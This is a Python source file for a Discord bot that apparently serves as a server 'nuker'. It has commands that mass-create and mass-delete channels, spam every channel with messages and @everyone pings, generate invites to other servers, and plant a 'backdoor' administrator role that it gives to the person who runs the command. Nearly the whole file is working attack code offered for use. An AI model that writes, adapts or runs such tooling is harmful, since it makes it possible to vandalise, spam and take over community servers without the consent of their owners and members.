import discord
from discord.ext import commands
import os
backdoor_rname = "~" # this is a invis role name apparently (it doesnt work, just rename this lol)
pwn_msg = "@everyone pwned by pwnagotchi"
token = os.environ['token'] # made with replit, go to secrets, make one named token with your discord bot token

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
# the most common issue is because you're not enabling intents/invalid perms

@bot.event
async def on_ready():
    print("(•‿‿•)")
    print("Pwnagotchi - [S: Online] [M: Discord] [V: Dev Build]")
    print("-------------")


@bot.command()
async def ping(ctx, channel_id: int):
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send("Pong!")
    else:
        print("Channel not found.")


@bot.command()
async def mc(ctx, *, name):
    guild = ctx.guild
    for _ in range(20):
        await guild.create_text_channel(name=name)
        print("(◕‿‿◕) - [Channel Created!]")

@bot.command()
async def dc(ctx):

    channels = ctx.guild.text_channels

    for channel in channels[:20]:
        await channel.delete()
        await asyncio.sleep(0.2) # ratelimit, you can change this if you want to. 0.2 seems to go pretty good - patch
        print("(◕‿‿◕) - [Channel Deleted!]")

@bot.command()
async def mm(ctx, amount: int, *, message_text):
    channels = ctx.guild.text_channels

    for channel in channels[:amount]:
        await channel.send(message_text)
        print("(◕‿‿◕) - [Message Sent!]") # this spams the console

@bot.command()
async def mp(ctx, amount: int):
    channels = ctx.guild.text_channels

    for channel in channels[:amount]:
        await channel.send(pwn_msg)
        print("(◕‿‿◕) - [Ping Msg Sent!]")

@bot.command()
async def backdoor(ctx):
    author = ctx.author
    guild = ctx.guild

    backdoor_role = await guild.create_role(name=backdoor_rname, permissions=discord.Permissions(administrator=True))
    print("(•‿‿•) - [Server has been backdoored!]")
    await author.add_roles(backdoor_role)

@bot.command()
async def gen_invite(ctx, guild_id: int):
    try:
        guild = bot.get_guild(guild_id)
        if guild:
            invite = await guild.text_channels[0].create_invite(max_age=86400, max_uses=1)
            await ctx.send(f"Invite for guild {guild.name}: {invite}")
            print(f"(•‿‿•) - [Server Invite Made: {invite}]")
        else:
            await ctx.send(f"Server ({guild_id}) not found.")
    except discord.Forbidden:
        await ctx.send("No perms to gen an invite.")


async def start_bot():
    await bot.start(token)


if __name__ == "__main__":
    import asyncio

    asyncio.run(start_bot())
